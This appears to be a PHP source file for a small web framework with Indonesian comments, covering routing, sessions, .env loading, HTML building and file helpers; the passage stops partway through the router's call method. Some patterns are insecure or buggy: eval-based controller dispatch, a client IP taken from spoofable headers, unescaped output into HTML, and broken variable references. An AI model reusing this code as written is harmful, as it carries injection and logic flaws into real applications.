<?php
session_start();

class ErrorHandler {
    // Fungsi penangan kesalahan kustom
    public static function cek($errno=null) {
        ini_set('display_errors', 0);
        if( is_callable($errno) ){$htmlerror = '<div><img width="250px" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/PjwhLS0gVXBsb2FkZWQgdG86IFNWRyBSZXBvLCB3d3cuc3ZncmVwby5jb20sIEdlbmVyYXRvcjogU1ZHIFJlcG8gTWl4ZXIgVG9vbHMgLS0+Cjxzdmcgd2lkdGg9IjgwMHB4IiBoZWlnaHQ9IjgwMHB4IiB2aWV3Qm94PSIwIDAgNjQgNjQiIGRhdGEtbmFtZT0iTGF5ZXIgMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMxOTA5MzM7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZS8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMTgsNi41QTEuNSwxLjUsMCwxLDAsMTYuNSw1LDEuNSwxLjUsMCwwLDAsMTgsNi41Wm0wLTJhLjUuNSwwLDEsMS0uNS41QS41LjUsMCwwLDEsMTgsNC41WiIvPjxjaXJjbGUgY2xhc3M9ImNscy0xIiBjeD0iMjIiIGN5PSI1IiByPSIxIi8+PGNpcmNsZSBjbGFzcz0iY2xzLTEiIGN4PSIxNCIgY3k9IjUiIHI9IjEiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik0zMiwxOC41QTE0LjUsMTQuNSwwLDEsMCw0Ni41LDMzLDE0LjUxLDE0LjUxLDAsMCwwLDMyLDE4LjVabTAsMjdBMTIuNSwxMi41LDAsMSwxLDQ0LjUsMzMsMTIuNTIsMTIuNTIsMCwwLDEsMzIsNDUuNVoiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik02Mi4yLDU2LjU0QTMzLjY5LDMzLjY5LDAsMCwwLDUxLjMyLDQ1LjQzYTIsMiwwLDAsMC0yLjI2LjA5TDQ3LjQ5LDQ0QTE4Ljk1LDE4Ljk1LDAsMCwwLDM1LDE0LjI2VjVhNSw1LDAsMCwwLTUtNUg2QTUsNSwwLDAsMCwxLDVWOWExLDEsMCwwLDAtMSwxdjRhMSwxLDAsMCwwLDEsMXYyYTEsMSwwLDAsMC0xLDF2NGExLDEsMCwwLDAsMSwxVjU5YTUsNSwwLDAsMCw1LDVIMzBhNSw1LDAsMCwwLDUtNVY1MS43NGExOSwxOSwwLDAsMCw5LjEtNC4xbDEuNDIsMS40MmEyLDIsMCwwLDAtLjA5LDIuMjZBMzMuNjksMzMuNjksMCwwLDAsNTYuNTQsNjIuMmwuNjMuNjNhNCw0LDAsMCwwLDUuNjYtNS42NlpNNjAuMTUsNTdsLTEuNTYsMS41N0w1Nyw2MC4xNWMtLjcyLS40Ni0xLjQxLS45NS0yLjA4LTEuNDVsMS44OC0xLjg4YS41LjUsMCwwLDAtLjcxLS43MWwtMiwyYy0uNTItLjQyLTEtLjg2LTEuNTItMS4zMWw0LjE4LTQuMTdBMzIuNDUsMzIuNDUsMCwwLDEsNjAuMTUsNTdaTTQ5LDMzQTE3LDE3LDAsMCwxLDMzLjg5LDQ5Ljg5bC0uNDQsMEMzMyw1MCwzMi40OSw1MCwzMiw1MGExNywxNywwLDAsMSwwLTM0Yy40OSwwLDEsMCwxLjQ1LjA3bC40NCwwQTE3LDE3LDAsMCwxLDQ5LDMzWk02LDJIMzBhMywzLDAsMCwxLDMsMi41SDMwYTQuMzQsNC4zNCwwLDAsMC0zLjM1LDEuNjVBMy40NSwzLjQ1LDAsMCwxLDI0LDcuNUgxMkEzLjQ1LDMuNDUsMCwwLDEsOS4zNSw2LjE1LDQuMzQsNC4zNCwwLDAsMCw2LDQuNUgzLjA1QTMsMywwLDAsMSw2LDJaTTMzLDUydjdhMywzLDAsMCwxLTMsM0g2YTMsMywwLDAsMS0zLTNWNS41SDZBMy40NSwzLjQ1LDAsMCwxLDguNjUsNi44NSw0LjM0LDQuMzQsMCwwLDAsMTIsOC41SDI0YTQuMzQsNC4zNCwwLDAsMCwzLjM1LTEuNjVBMy40NSwzLjQ1LDAsMCwxLDMwLDUuNWgzVjE0bC0xLDBhMTksMTksMCwwLDAtMTYuMzcsOS40MUwxMiwyMC44YTMuNDYsMy40NiwwLDEsMC0uNjMuNzhsMy43OSwyLjdhMTguODcsMTguODcsMCwwLDAsMiwyMC40N0wxMi41NSw0OGEyLjUsMi41LDAsMCwwLTEuMDUsMnYyLjUyYTMuNSwzLjUsMCwxLDAsMSwwVjUwYTEuNDksMS40OSwwLDAsMSwuNjMtMS4yMmw0LjYxLTMuM0ExOC45NCwxOC45NCwwLDAsMCwzMiw1MlpNOSwyMS41QTIuNSwyLjUsMCwxLDEsMTEuNSwxOSwyLjUsMi41LDAsMCwxLDksMjEuNVptMywzMkEyLjUsMi41LDAsMSwxLDkuNSw1NiwyLjUsMi41LDAsMCwxLDEyLDUzLjVabTM0Ljg5LTguNzMsMS40NCwxLjQ0LTIuMTIsMi4xMkw0NC44NCw0N0ExOS4yNiwxOS4yNiwwLDAsMCw0Ni44OSw0NC43N1ptLjI0LDUuNDcsMy4xMi0zLjEyYTMyLjEyLDMyLjEyLDAsMCwxLDUuODUsNC43Nkw1MS44OCw1Ni4xQTMxLjczLDMxLjczLDAsMCwxLDQ3LjEzLDUwLjI0Wk02MS40MSw2MS40MWEyLDIsMCwwLDEtMi44MiwwbDIuODItMi44MmEyLDIsMCwwLDEsMCwyLjgyWiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTMzLjIzLDI1YTEuNTUsMS41NSwwLDAsMC0yLjQ2LDBMMjMuNDQsMzUuNjFBMi4xNiwyLjE2LDAsMCwwLDI1LjIxLDM5SDM4Ljc5YTIuMTYsMi4xNiwwLDAsMCwxLjc3LTMuMzlabTUuNywxMS44OWEuMTUuMTUsMCwwLDEtLjE0LjA5SDI1LjIxYS4xNS4xNSwwLDAsMS0uMTQtLjA5LjE2LjE2LDAsMCwxLDAtLjE2bDYuOTItMTAsNi45MiwxMEEuMTYuMTYsMCwwLDEsMzguOTMsMzYuOTFaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMzIsMjkuNWEuNS41LDAsMCwwLS41LjV2M2EuNS41LDAsMCwwLDEsMFYzMEEuNS41LDAsMCwwLDMyLDI5LjVaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMzIuMTksMzQuNTRhLjUuNSwwLDAsMC0uMzgsMCwuNTMuNTMsMCwwLDAtLjI3LjI3LjQzLjQzLDAsMCwwLDAsLjE5LjQ3LjQ3LDAsMCwwLC4xNS4zNS4zNi4zNiwwLDAsMCwuMTYuMTEuNDcuNDcsMCwwLDAsLjM4LDAsLjM2LjM2LDAsMCwwLC4xNi0uMTEuNDguNDgsMCwwLDAsMC0uN0EuMzYuMzYsMCwwLDAsMzIuMTksMzQuNTRaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNDMuNjUsMTMuMzVhLjQ4LjQ4LDAsMCwwLC43LDBsMi0yYS40OS40OSwwLDEsMC0uNy0uN2wtMiwyQS40OC40OCwwLDAsMCw0My42NSwxMy4zNVoiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik00OC43OCwxMy41NWwtMiwxYS41LjUsMCwwLDAsLjIyLjk1LjU0LjU0LDAsMCwwLC4yMi0uMDVsMi0xYS41LjUsMCwwLDAtLjQ0LS45WiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTQyLjUsMTFWOWEuNS41LDAsMCwwLTEsMHYyYS41LjUsMCwwLDAsMSwwWiIvPjwvc3ZnPg==">
            </img></div>';
            try{
                $errno();
            } catch (\Throwable $e) {
                // Tangani kesalahan di sini
                echo "<div style=\"font-family: calibri;font-size: 18px; margin: 40px 50px;padding: 30px; box-shadow:0 0 10px #aaa;\">";
                echo $htmlerror.'<h1 style="margin:0;">Error</h1>Terjadi kesalahan: ' . 
                str_replace(",","<br>",  $e->getMessage() );
                echo "</div>";
            }
        }
    }
}

class Session{

    public static function put($name = "", $data_arr = [])
    {
        $_SESSION[$name.SESSION] = $data_arr;
    }

    public static function delete($name = '')
    {
        unset($_SESSION[$name.SESSION]);
    }

    public static function get($name = "", $defaultnull = "")
    {
        if(isset($_SESSION[$name.SESSION])){
            if ($_SESSION[$name.SESSION] != "") {
                return $_SESSION[$name.SESSION];
            }else{
                return $defaultnull;
            }
        }else{
            if ($defaultnull != "") {
                return $defaultnull;
            }else{
                return "";
            }
        }
    }
}

class HeaderContent {
    public static function set($contentType="") {
        $validTypes = ["javascript", "css", "json", "php", "python", "text", "html"];
        $contentTypeLower = strtolower($contentType);
        
        if (in_array($contentTypeLower, $validTypes)) {
            $contentTypeHeader = 'Content-Type: ';
            switch ($contentTypeLower) {
                case 'javascript':
                    $contentTypeHeader .= 'application/javascript';
                    break;
                case 'css':
                    $contentTypeHeader .= 'text/css';
                    break;
                case 'json':
                    $contentTypeHeader .= 'application/json';
                    break;
                case 'php':
                    $contentTypeHeader .= 'text/php'; // Assuming PHP script will output HTML
                    break;
                case 'python':
                    $contentTypeHeader .= 'text/python'; // Not a standard MIME type, adjust accordingly
                    break;
                case 'text':
                    $contentTypeHeader .= 'text/plain';
                    break;
                case 'html':
                    $contentTypeHeader .= 'text/html';
                    break;
                default:
                    $contentTypeHeader .= 'text/plain';
            }
            header($contentTypeHeader);
        } else {
            // Invalid content type
            header('Content-Type: text/plain');
        }
    }
}

class Environtment{
   public function __construct($path = "./.env"){
       if(file_exists($path)){
          $getenv = parse_ini_file($path);
          foreach ($getenv as $key => $value) {
              $this->setEnv($key, $value);
          }
        }
   }
    
  public function setEnv($name="", $val = ""){
      if(!defined($name)){
          $_ENV[$name] = $val;
          define($name, $val);
      }
  }

  public static function get($name=""){
      return $_ENV[$name]?$_ENV[$name]:null;
  }
  
}

class HtmlContainer{
    
    private $datahead = "";
    private $databody = "";
    
    public function head(){
        $arg = func_get_args();
        if($arg[0]){
            $data = $arg[0];
            $title = "Title Website";
            $css = [];
            $meta = [];
            $script = [];
            if($data["title"]){
                $title = $data['title'];
            }
            if($data["css"]){
                $css = is_array($data['css'])? $data['css'] : [];
            }
            if($data["meta"]){
                $meta = is_array($data['meta'])? $data['meta'] : [];
            }
            if($data["script"]){
                $script = is_array($data['script'])? $data['script'] : [];
            }
        }
        $this->datahead = " <head>\n";
        $this->datahead .= "  <meta charset=\"utf-8\">\n";
        $this->datahead .= "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n";
        foreach($meta as $metaload){
            if($metaload["name"] && $metaload["content"]){
                $name = $metaload["name"];
                $content = $metaload["content"];
                $this->datahead .= "  <meta name=\"$name\" content=\"$content\">\n";
            }
        }
        $this->datahead .= "  <title>$title</title>\n";
        foreach($css as $cssload){
            $this->datahead .= "  <link rel=\"stylesheet\" type=\"text/css\" href=\"$cssload\" />\n";
        }
        foreach($script as $scriptload){
            $this->datahead .= "  <script src=\"$scriptload\"></script>\n";
        }
        $this->datahead .= " </head>\n";
        return $this;
    }
    
    public function body($html=""){
        $this->databody = "<body>";
        $this->databody .= $html;
        $this->databody .= "</body>\n";
        return $this;
    }
    
    public function get(){
        $html = "<html>\n";
        $html .= $this->datahead;
        $html .= $this->databody;
        $html .= "</html>";
        echo $html;
    }
    
}

class Files
{
    public static function exist(...$arg)
    {
        if(isset($arg[0]))
        {
            if(file_exists($arg[0]))
            {
                return true;
            }else{
                return false;
            }
        }
    }

    public static function slug(...$arg){
        if(isset($arg[0])){
            $name = $arg[0];
            $name = str_replace('"','',$name);
            $name = str_replace("'",'',$name);
            $name = str_replace(" ",'-',$name);
            $name = str_replace("@",'',$name);
            $name = str_replace(",",'',$name);
            $name = str_replace(".",'',$name);
            $name = str_replace("/",'',$name);
            $name = str_replace("|",'',$name);
            $name = str_replace("\\",'',$name);
            $name = str_replace("=",'',$name);
            $name = str_replace("+",'',$name);
            $name = str_replace("(",'',$name);
            $name = str_replace(")",'',$name);
            $name = str_replace("[",'',$name);
            $name = str_replace("]",'',$name);
            $name = str_replace(";",'',$name);
            $name = str_replace(":",'',$name);
            $name = str_replace("`",'',$name);
            $name = str_replace("#",'',$name);
            $name = str_replace("\$",'',$name);
            $name = str_replace("%",'',$name);
            $name = str_replace("^",'',$name);
            $name = str_replace("&",'',$name);
            $name = str_replace("?",'',$name);
            $name = str_replace("~",'',$name);
            return strtolower($name);
        }
    }

    public static function remove(...$arg){
        if(isset($arg[0])){
            if(file_exists($arg[0])
                && $arg[0] != ''
                && $arg != '/'
                && $arg != 'web'
                && $arg != 'views'
                && $arg != 'vendor'
                && $arg != 'module'
            ){
                unlink($arg[0]);
            }
        }
    }

    public static function write(...$arg)
    {
        if(isset($arg[0]) && isset($arg[1]))
        {
            $myfile = fopen($arg[0], "w") or die("Unable to open file!");
            $txt = $arg[1];
            fwrite($myfile, $txt);
            fclose($myfile);
        }
    }

    public static function read(...$arg)
    {
        $path = $arg[0];
        if(!file_exists($path)){
            return null;
        }
        $myfile = fopen($path, "r") or die("Unable to open file!");
        $er = fread($myfile,filesize($path));
        fclose($myfile);
        return $er;
    }
    
    function dir($directory = "./") {
        // Get the list of files and folders in the directory
        $contents = scandir($directory);
    
        // Exclude "." and ".." from the list
        $contents = array_diff($contents, array('.', '..'));
    
        // Initialize the array to hold the result
        $result = [];
    
        // Iterate through each item
        foreach ($contents as $item) {
            $itemPath = $directory . '/' . $item;
    
            // Determine if it's a folder or file
            if (is_dir($itemPath)) {
                // If it's a folder, add it to the result with type "folder"
                $result[] = [
                    'name' => $item,
                    'type' => 'folder'
                ];
            } else {
                // If it's a file, determine its extension and add it to the result with the corresponding type
                $extension = pathinfo($itemPath, PATHINFO_EXTENSION);
                $result[] = [
                    'name' => $item,
                    'type' => $extension ? $extension . ' file' : 'file'
                ];
            }
        }
    
        // Custom comparison function to sort folders first, then files, both alphabetically by name
        usort($result, function($a, $b) {
            if ($a['type'] === 'folder' && $b['type'] === 'folder') {
                return strcmp($a['name'], $b['name']);
            } elseif ($a['type'] === 'folder') {
                return -1;
            } elseif ($b['type'] === 'folder') {
                return 1;
            } else {
                return strcmp($a['name'], $b['name']);
            }
        });
    
        // Return the sorted list
        return $result;

    }

}

class Route {
    private static $route = [];
    private static $middleware = [];
    private static $use = [];
    private static $activeadd = NULL;
    private static $datamidleware = [];

    function __construct($base = "./", $url_base = "") {
        ini_set('display_errors', 0);
        $this->setEnv('SETUP_PATH', $base);
        $this->setEnv('PATH', $url_base);
        $this->setEnv('ASSET', $url_base);
        if(isset($_SERVER["REQUEST_URI"]))
        {
            $url = urldecode( explode('?',$_SERVER["REQUEST_URI"])[0]);
            $arrayurl = explode("/", $url);
            $lasturl = array_pop($arrayurl);
            if($lasturl != ""){
                $arrayurl[] = $lasturl; 
            }
            $this->setEnv('URL',  join("/",$arrayurl));
        }
        $this->setEnv('ROOT', dirname($_SERVER['DOCUMENT_ROOT']));
        $this->setEnv('APP', $_SERVER['DOCUMENT_ROOT']);
        $this->setEnv('IP', $this->get_client_ip());
        if(file_exists(SETUP_PATH.'.env')){
            $env = new Env(SETUP_PATH.'.env');
        }
    }

    private function get_client_ip() {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP'))
            $ipaddress = getenv('HTTP_CLIENT_IP');
        else if(getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if(getenv('HTTP_X_FORWARDED'))
            $ipaddress = getenv('HTTP_X_FORWARDED');
        else if(getenv('HTTP_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
        else if(getenv('REMOTE_ADDR'))
            $ipaddress = getenv('REMOTE_ADDR');
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }

    private function setEnv($name="", $val = ""){
        if(!defined($name)){
            $_ENV[$name] = $val;
            define($name, $val);
        }
    }  

    // midleware setup
    public function middleware(){
        $arg = func_get_args();
        if(isset($arg[0])){
            if(is_callable($arg[0])){
                if(!isset(self::$middleware[self::$activeadd])){
                    self::$middleware[self::$activeadd] = [];
                }
                self::$middleware[self::$activeadd][] = $arg[0];
            }else{
                if(!isset(self::$middleware[self::$activeadd])){
                    self::$middleware[self::$activeadd] = [];
                }
                self::$middleware[self::$activeadd][] = $arg[0];
            }
        }
        return $this;
    }

    public function addMidleware(){
        $arg = func_get_args();
        if(isset($arg[0]) && isset($arg[1])){
            self::$datamidleware[$arg[0]] = $arg[1];
        }
    }

    public function cors($option = null){
        if($option === "all"){
            header('Access-Control-Allow-Origin: *');
            header('Access-Control-Allow-Methods: GET, POST');
        }
        return $this;
    }

    public function addUse(){
        $arg = func_get_args();
        if(isset($arg[0])){
            if(is_string($arg[0])){
                if(!isset(self::$use[self::$activeadd])){
                    self::$use[self::$activeadd] = [];
                }
                self::$use[self::$activeadd][] = $arg[0];
            }
        }
        return $this;
    }

    public static function session(){
        $arg = func_get_args();
        if(isset($arg[0]) && $arg[0] == true){
            defined('SESSION') or die();
            if(files::exist(SETUP_PATH.'session53539'.SESSION) === false){
                mkdir(SETUP_PATH.'session53539'.SESSION);
            }
            $filesession = SETUP_PATH.'session53539'.SESSION;
            if(session_status() === ''){
                ini_set('session.save_path',realpath(dirname($_SERVER['DOCUMENT_ROOT']) . '/'.$filesession));
                ini_set('session.gc_probability', 1);
            }

            session_start();
        }
    }

    // add new route
    public static function add(){
        $argv = func_get_args();
        $newRoute = [];
        if(isset($argv[0])){
            if(substr( $argv[0], 0,1) != '/'){
                $r = PATH."/".$argv[0];
                $newRoute["url"] = PATH."/".$argv[0];
            }else{
                $newRoute["url"] = PATH.$argv[0];
            }
            self::$activeadd = $newRoute['url'];
            $pathofroute = [];
            $pathofparams = [];
            $newRoute['totpath'] = 0;
            $newRoute['action-type'] = NULL;
            $newRoute['action'] = NULL;
            foreach(explode("/",$newRoute['url']) as $key => $pathRoute){
                if(strpos($pathRoute, "{") !== false && strpos($pathRoute, "}") !== false){
                    $pathofparamsnew = [];
                    $pathofparamsnew['position'] = $key;
                    $pathofparamsnew['nameparams'] = $pathRoute;
                    $pathofparams[] = $pathofparamsnew;
                    $pathofroute[] = $pathRoute;
                    $newRoute['totpath'] +=1;
                }else{
                    $newRoute['totpath'] +=1;
                    $pathofroute[] = $pathRoute;
                }
            }
            $newRoute['routepath'] = $pathofroute;
            $newRoute['params'] = $pathofparams;

            // cek seccond parameters
            if(isset($argv[1])){
                $action = $argv[1];
                if( is_callable($action) ){
                    $newRoute['action-type'] = 'function';
                    $newRoute['action'] = $argv[1];
                }else{
                    if(strpos($argv[1],'@') !== false){
                        $newRoute['action-type'] = 'controller';
                        $newRoute['action'] = $argv[1];
                    }
                }
            }
        }
        self::$route[] = $newRoute;
        return (new self);
    }

    // validation route after call
    private static function validating(){
        $argv = func_get_args();
        $htmlerror = '<div><img width="250px" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/PjwhLS0gVXBsb2FkZWQgdG86IFNWRyBSZXBvLCB3d3cuc3ZncmVwby5jb20sIEdlbmVyYXRvcjogU1ZHIFJlcG8gTWl4ZXIgVG9vbHMgLS0+Cjxzdmcgd2lkdGg9IjgwMHB4IiBoZWlnaHQ9IjgwMHB4IiB2aWV3Qm94PSIwIDAgNjQgNjQiIGRhdGEtbmFtZT0iTGF5ZXIgMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMxOTA5MzM7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZS8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMTgsNi41QTEuNSwxLjUsMCwxLDAsMTYuNSw1LDEuNSwxLjUsMCwwLDAsMTgsNi41Wm0wLTJhLjUuNSwwLDEsMS0uNS41QS41LjUsMCwwLDEsMTgsNC41WiIvPjxjaXJjbGUgY2xhc3M9ImNscy0xIiBjeD0iMjIiIGN5PSI1IiByPSIxIi8+PGNpcmNsZSBjbGFzcz0iY2xzLTEiIGN4PSIxNCIgY3k9IjUiIHI9IjEiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik0zMiwxOC41QTE0LjUsMTQuNSwwLDEsMCw0Ni41LDMzLDE0LjUxLDE0LjUxLDAsMCwwLDMyLDE4LjVabTAsMjdBMTIuNSwxMi41LDAsMSwxLDQ0LjUsMzMsMTIuNTIsMTIuNTIsMCwwLDEsMzIsNDUuNVoiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik02Mi4yLDU2LjU0QTMzLjY5LDMzLjY5LDAsMCwwLDUxLjMyLDQ1LjQzYTIsMiwwLDAsMC0yLjI2LjA5TDQ3LjQ5LDQ0QTE4Ljk1LDE4Ljk1LDAsMCwwLDM1LDE0LjI2VjVhNSw1LDAsMCwwLTUtNUg2QTUsNSwwLDAsMCwxLDVWOWExLDEsMCwwLDAtMSwxdjRhMSwxLDAsMCwwLDEsMXYyYTEsMSwwLDAsMC0xLDF2NGExLDEsMCwwLDAsMSwxVjU5YTUsNSwwLDAsMCw1LDVIMzBhNSw1LDAsMCwwLDUtNVY1MS43NGExOSwxOSwwLDAsMCw5LjEtNC4xbDEuNDIsMS40MmEyLDIsMCwwLDAtLjA5LDIuMjZBMzMuNjksMzMuNjksMCwwLDAsNTYuNTQsNjIuMmwuNjMuNjNhNCw0LDAsMCwwLDUuNjYtNS42NlpNNjAuMTUsNTdsLTEuNTYsMS41N0w1Nyw2MC4xNWMtLjcyLS40Ni0xLjQxLS45NS0yLjA4LTEuNDVsMS44OC0xLjg4YS41LjUsMCwwLDAtLjcxLS43MWwtMiwyYy0uNTItLjQyLTEtLjg2LTEuNTItMS4zMWw0LjE4LTQuMTdBMzIuNDUsMzIuNDUsMCwwLDEsNjAuMTUsNTdaTTQ5LDMzQTE3LDE3LDAsMCwxLDMzLjg5LDQ5Ljg5bC0uNDQsMEMzMyw1MCwzMi40OSw1MCwzMiw1MGExNywxNywwLDAsMSwwLTM0Yy40OSwwLDEsMCwxLjQ1LjA3bC40NCwwQTE3LDE3LDAsMCwxLDQ5LDMzWk02LDJIMzBhMywzLDAsMCwxLDMsMi41SDMwYTQuMzQsNC4zNCwwLDAsMC0zLjM1LDEuNjVBMy40NSwzLjQ1LDAsMCwxLDI0LDcuNUgxMkEzLjQ1LDMuNDUsMCwwLDEsOS4zNSw2LjE1LDQuMzQsNC4zNCwwLDAsMCw2LDQuNUgzLjA1QTMsMywwLDAsMSw2LDJaTTMzLDUydjdhMywzLDAsMCwxLTMsM0g2YTMsMywwLDAsMS0zLTNWNS41SDZBMy40NSwzLjQ1LDAsMCwxLDguNjUsNi44NSw0LjM0LDQuMzQsMCwwLDAsMTIsOC41SDI0YTQuMzQsNC4zNCwwLDAsMCwzLjM1LTEuNjVBMy40NSwzLjQ1LDAsMCwxLDMwLDUuNWgzVjE0bC0xLDBhMTksMTksMCwwLDAtMTYuMzcsOS40MUwxMiwyMC44YTMuNDYsMy40NiwwLDEsMC0uNjMuNzhsMy43OSwyLjdhMTguODcsMTguODcsMCwwLDAsMiwyMC40N0wxMi41NSw0OGEyLjUsMi41LDAsMCwwLTEuMDUsMnYyLjUyYTMuNSwzLjUsMCwxLDAsMSwwVjUwYTEuNDksMS40OSwwLDAsMSwuNjMtMS4yMmw0LjYxLTMuM0ExOC45NCwxOC45NCwwLDAsMCwzMiw1MlpNOSwyMS41QTIuNSwyLjUsMCwxLDEsMTEuNSwxOSwyLjUsMi41LDAsMCwxLDksMjEuNVptMywzMkEyLjUsMi41LDAsMSwxLDkuNSw1NiwyLjUsMi41LDAsMCwxLDEyLDUzLjVabTM0Ljg5LTguNzMsMS40NCwxLjQ0LTIuMTIsMi4xMkw0NC44NCw0N0ExOS4yNiwxOS4yNiwwLDAsMCw0Ni44OSw0NC43N1ptLjI0LDUuNDcsMy4xMi0zLjEyYTMyLjEyLDMyLjEyLDAsMCwxLDUuODUsNC43Nkw1MS44OCw1Ni4xQTMxLjczLDMxLjczLDAsMCwxLDQ3LjEzLDUwLjI0Wk02MS40MSw2MS40MWEyLDIsMCwwLDEtMi44MiwwbDIuODItMi44MmEyLDIsMCwwLDEsMCwyLjgyWiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTMzLjIzLDI1YTEuNTUsMS41NSwwLDAsMC0yLjQ2LDBMMjMuNDQsMzUuNjFBMi4xNiwyLjE2LDAsMCwwLDI1LjIxLDM5SDM4Ljc5YTIuMTYsMi4xNiwwLDAsMCwxLjc3LTMuMzlabTUuNywxMS44OWEuMTUuMTUsMCwwLDEtLjE0LjA5SDI1LjIxYS4xNS4xNSwwLDAsMS0uMTQtLjA5LjE2LjE2LDAsMCwxLDAtLjE2bDYuOTItMTAsNi45MiwxMEEuMTYuMTYsMCwwLDEsMzguOTMsMzYuOTFaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMzIsMjkuNWEuNS41LDAsMCwwLS41LjV2M2EuNS41LDAsMCwwLDEsMFYzMEEuNS41LDAsMCwwLDMyLDI5LjVaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNMzIuMTksMzQuNTRhLjUuNSwwLDAsMC0uMzgsMCwuNTMuNTMsMCwwLDAtLjI3LjI3LjQzLjQzLDAsMCwwLDAsLjE5LjQ3LjQ3LDAsMCwwLC4xNS4zNS4zNi4zNiwwLDAsMCwuMTYuMTEuNDcuNDcsMCwwLDAsLjM4LDAsLjM2LjM2LDAsMCwwLC4xNi0uMTEuNDguNDgsMCwwLDAsMC0uN0EuMzYuMzYsMCwwLDAsMzIuMTksMzQuNTRaIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNDMuNjUsMTMuMzVhLjQ4LjQ4LDAsMCwwLC43LDBsMi0yYS40OS40OSwwLDEsMC0uNy0uN2wtMiwyQS40OC40OCwwLDAsMCw0My42NSwxMy4zNVoiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik00OC43OCwxMy41NWwtMiwxYS41LjUsMCwwLDAsLjIyLjk1LjU0LjU0LDAsMCwwLC4yMi0uMDVsMi0xYS41LjUsMCwwLDAtLjQ0LS45WiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTQyLjUsMTFWOWEuNS41LDAsMCwwLTEsMHYyYS41LjUsMCwwLDAsMSwwWiIvPjwvc3ZnPg==">
            </img></div>';
        try{
            if(isset($argv[0])){
                $parameterone = $argv[0];
                $routeactive = self::$route[$parameterone];
                
                if($routeactive['action-type'] != NULL){
                    if($routeactive['action-type'] == 'function'){
                        $pathurl = explode('/',URL);
                        $params = [];
                        foreach($routeactive['params'] as $getpar){
                            $params[] = $pathurl[$getpar['position']];
                        }
                        $params = (array) $params;

                        if(isset(self::$use[$routeactive['url']])){
                            foreach(self::$use[$routeactive['url']] as $usecall){
                                include_once SETUP_PATH.$usecall;
                            }
                        }

                        if(isset(self::$middleware[$routeactive['url']])){
                            foreach(self::$middleware[$routeactive['url']] as $midlecall){
                                if(is_callable($midlecall)){
                                    $midlecall();
                                }else{
                                    $cl = self::$datamidleware[$midlecall];
                                    $cl();
                                }
                            }
                        }
                        $routeactive['action'](...$params);
                    }else{
                        $pathurl = explode('/',URL);
                        $params = [];
                        foreach($routeactive['params'] as $getpar){
                            $params[] = $pathurl[$getpar['position']];
                        }
                        $params = (array) $params;
                        if(isset(self::$use[$routeactive['url']])){
                            foreach(self::$use[$routeactive['url']] as $usecall){
                                include_once SETUP_PATH.$usecall;
                            }
                        }

                        $path = explode("@",$routeactive['action']);

                        $pathDir = SETUP_PATH.$path[0];
                        

                        if(file_exists($pathDir.'.php')){

                            include_once $pathDir.'.php';
                            if(isset(self::$middleware[$routeactive['url']])){
                                foreach(self::$middleware[$routeactive['url']] as $midlecall){
                                    if(is_callable($midlecall)){
                                        $midlecall();
                                    }else{
                                        self::$datamidleware[$midlecall]();
                                    }
                                }
                            }
                            $pat = explode('/',$path[0]);
                            $pcount = count($pat) - 1;
                            $nameclass = ucfirst($pat[$pcount]);
                            $namefunc = $path[1];
                            $ripText = " ".$nameclass."::".$namefunc."(...\$params); ";
                            eval($ripText);
                        }else{
                            $route = self::$route;
                            foreach($route as $y => $founderror){
                                if($founderror['url'] == '/404'){
                                    (new self)->validating($y);
                                    die();
                                }
                            }
                            echo "/404 <br>page not found";
                        }

                    }
                }
            }
        } catch (\Throwable $e) {
            // Tangani kesalahan di sini
            echo "<div style=\"font-family: calibri;font-size: 18px; margin: 40px 50px;padding: 30px; box-shadow:0 0 10px #aaa;\">";
            echo $htmlerror.'<h1 style="margin:0;">Error</h1>Terjadi kesalahan: ' . 
            str_replace(",","<br>",  $e->getMessage() );
            echo "</div>";
        }
        die();
    }

    // starting route
    public static function call(){
        $route = self::$route;
        // cari data yang sesuai dengan URL
        // cek url;
        foreach($route as $key => $routedata){
            $arrayurl = explode("/", $routedata['url']);
            $lasturl = array_pop($arrayurl);
            if($lasturl != ""){
                $arrayurl[] = $lasturl; 
            }
            if(join("/",$arrayurl) == URL){
                (new self)->validating($key);
                die();
            }
        }

        $pathurl = explode('/',URL);

        $countpathurl = count($pathurl);
        
        // cek url base on count path of url and filter it
        $pathofroot = array_filter($route, function() use ($countpathurl, $pathurl) {
            $argv = func_get_args();
            if($arg[0]['totpath'] == $countpathurl){
                return $arg;
            }
        }, ARRAY_FILTER_USE_BOTH  );
        
        
